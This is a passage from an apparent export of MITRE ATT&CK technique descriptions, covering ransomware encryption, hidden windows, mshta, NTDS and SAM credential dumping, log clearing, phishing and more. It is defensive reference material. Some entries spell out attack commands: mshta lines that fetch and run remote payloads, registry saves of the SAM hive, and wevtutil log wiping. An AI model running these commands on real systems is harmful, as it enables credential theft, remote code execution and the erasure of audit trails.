In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021) 

To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as ""print bombing"").(Citation: NHS Digital Egregor Nov 2020)(Citation: Varonis)

In cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1) For example, in AWS environments, adversaries may leverage services such as AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.(Citation: Halcyon AWS Ransomware 2025)","ESXi, IaaS, Linux, macOS, Windows",FALSE,FALSE,2019-03-15T13:59:30Z
attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0,18,T1564.003,Hidden Window,"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. 

Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)

On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.

Similarly, on Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.(Citation: PowerShell About 2019)

The Windows Registry can also be edited to hide application windows from the current user. For example, by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` Registry key to a maximum value, PowerShell windows will open off screen and be hidden.(Citation: Cantoris Computing)

In addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack)  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be invisible to other desktops windows.

Adversaries may also leverage cmd.exe(Citation: Cybereason - Hidden Malicious Remote Access) as a parent process, and then utilize a LOLBin, such as DeviceCredentialDeployment.exe,(Citation: LOLBAS Project GitHub Device Cred Dep)(Citation: SecureList BlueNoroff Device Cred Dev) to hide windows.","Linux, macOS, Windows",FALSE,FALSE,2020-03-13T20:26:49Z
attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1,18,T1059.006,Python,"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)

Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-09T14:38:24Z
attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24,18,T1003.003,NTDS,"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)

In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)

The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy
",Windows,FALSE,FALSE,2020-02-11T18:42:35Z
attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830,17,T1059,Command and Scripting Interpreter,"Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).

Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)","Containers, ESXi, IaaS, Identity Provider, Linux, macOS, Network Devices, Office Suite, SaaS, Windows",FALSE,FALSE,2017-05-31T21:30:49Z
attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade,17,T1218.005,Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",Windows,FALSE,FALSE,2020-01-23T19:32:49Z
attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18,17,T1571,Non-Standard Port,"Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.

Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-14T18:18:32Z
attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f,16,T1135,Network Share Discovery,"Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. 

File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.","Linux, macOS, Windows",FALSE,FALSE,2017-12-14T16:46:06Z
attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795,16,T1583.003,Virtual Private Server,"Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.

Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)",PRE,FALSE,FALSE,2020-10-01T00:44:23Z
attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4,16,T1102.002,Bidirectional Communication,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. 

Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-14T22:34:03Z
attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4,16,T1569.002,Service Execution,"Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).

[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.

Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.",Windows,FALSE,FALSE,2020-03-10T18:33:36Z
attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230,15,T1598.003,Spearphishing Link,"Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

Adversaries may also embed “tracking pixels,” ""web bugs,"" or ""web beacons"" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug)(Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server.(Citation: Ryte Wiki)(Citation: IAPP)

Adversaries may also be able to spoof a complete website using what is known as a ""browser-in-the-browser"" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)

Adversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)

Adversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as “quishing”). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user’s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile’s smaller form factor.

From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",PRE,FALSE,FALSE,2020-10-02T17:09:50Z
attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa,15,T1007,System Service Discovery,"Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>. Adversaries may also gather information about schedule tasks via commands such as `schtasks` on Windows or `crontab -l` on Linux and macOS.(Citation: Elastic Security Labs GOSAR 2024)(Citation: SentinelLabs macOS Malware 2021)(Citation: Splunk Linux Gormir 2024)(Citation: Aquasec Kinsing 2020)

Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:21Z
attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d,15,T1055,Process Injection,"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. 

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. 

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:47Z
attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b,15,T1572,Protocol Tunneling,"Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. 

There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling)(Citation: Sygnia Abyss Locker 2025) 

[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) 

Adversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-15T16:03:39Z
attack-pattern--830c9528-df21-472c-8c14-a036bf17d665,15,T1102,Web Service,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise.(Citation: Broadcom BirdyClient Microsoft Graph API 2024) Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.

Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","ESXi, Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:13Z
attack-pattern--851e071f-208d-4c79-adc6-5974c85c78f3,15,T1657,Financial Theft,"Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,(Citation: FBI-ransomware) business email compromise (BEC) and fraud,(Citation: FBI-BEC) ""pig butchering,""(Citation: wired-pig butchering) bank hacking,(Citation: DOJ-DPRK Heist) and exploiting cryptocurrency networks.(Citation: BBC-Ronin) 

Adversaries may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) to conduct unauthorized transfers of funds.(Citation: Internet crime report 2022) In the case of business email compromise or email fraud, an adversary may utilize [Impersonation](https://attack.mitre.org/techniques/T1684/001) of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.(Citation: FBI-BEC) This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.(Citation: VEC)

Extortion by ransomware may occur, for example, when an adversary demands payment from a victim after [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) (Citation: NYT-Colonial) and [Exfiltration](https://attack.mitre.org/tactics/TA0010) of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary.(Citation: Mandiant-leaks) Adversaries may use dedicated leak sites to distribute victim data.(Citation: Crowdstrike-leaks)

Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and business disruption.(Citation: AP-NotPetya)","Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2023-08-18T20:50:04Z
attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd,15,T1110,Brute Force,"Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.

Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access. 

If an adversary guesses the correct password but fails to login to a compromised account due to location-based conditional access policies, they may change their infrastructure until they match the victim’s location and therefore bypass those policies.(Citation: ReliaQuest Health Care Social Engineering Campaign 2024)","Containers, ESXi, IaaS, Identity Provider, Linux, macOS, Network Devices, Office Suite, SaaS, Windows",FALSE,FALSE,2017-05-31T21:31:22Z
attack-pattern--cd92d2b8-ce43-4666-9472-f1b4b9f4f8be,15,T1684.001,Impersonation,"Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary’s ultimate goals, possibly against multiple victims.

In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).

Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary’s goal.  

Impersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: Crowdstrike BEC)

There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may Compromise Accounts targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC)","Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2026-04-14T22:54:01Z
attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011,14,T1003.002,Security Account Manager,"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.

A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with Reg:

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)

Notes: 

* RID 500 account is the local, built-in administrator.
* RID 501 is the guest account.
* User accounts start with a RID of 1,000+.
",Windows,FALSE,FALSE,2020-02-11T18:42:07Z
attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41,14,T1573.001,Symmetric Cryptography,"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-16T15:45:17Z
attack-pattern--3dc8c101-d4db-4f4d-8150-1b5a76ca5f1b,14,T1586.002,Email Accounts,"Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).

A variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing](https://attack.mitre.org/techniques/T1566) emails may evade reputation-based email filtering rules.

Adversaries can use a compromised email account to hijack existing email threads with targets of interest.",PRE,FALSE,FALSE,2020-10-01T01:20:53Z
attack-pattern--5502c4e9-24ef-4d5f-8ee9-9e906c2f82c4,14,T1595.002,Vulnerability Scanning,"Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.

These scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",PRE,FALSE,FALSE,2020-10-02T16:55:16Z
attack-pattern--635cbe30-392d-4e27-978e-66774357c762,14,T1136.001,Local Account,"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. 

For example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account.  In Linux, the `useradd` command can be used, while on macOS systems, the <code>dscl -create</code> command can be used. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>, to ESXi servers via `esxcli system account add`, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)

Adversaries may also create new local accounts on network firewall management consoles – for example, by exploiting a vulnerable firewall management system, threat actors may be able to establish super-admin accounts that could be used to modify firewall rules and gain further access to the network.(Citation: Cyber Security News)

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.","Containers, ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-01-28T13:50:22Z
attack-pattern--69f897fd-12a9-4c89-ad6a-46d2f3c38262,14,T1589.002,Email Addresses,"Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.

Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)

Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).",PRE,FALSE,FALSE,2020-10-02T14:56:24Z
attack-pattern--75b9a4d2-d4e2-4ca1-9aab-1badd9e05fd0,14,T1685.005,Clear Windows Event Logs,"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.

With administrator privileges, the event logs can be cleared with the following utility commands:

* `wevtutil cl system`
* `wevtutil cl application`
* `wevtutil cl security`

These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command `Remove-EventLog -LogName Security` to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)

Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\Windows\System32\winevt\logs\`.",Windows,FALSE,FALSE,2026-04-14T22:54:03Z
attack-pattern--837f9164-50af-4ac0-8219-379d8a74cefc,14,T1552.001,Credentials In Files,"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.(Citation: SRD GPP)

In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.(Citation: Specter Ops - Cloud Credential Storage)","Containers, IaaS, Linux, macOS, Windows",FALSE,FALSE,2020-02-04T12:52:13Z
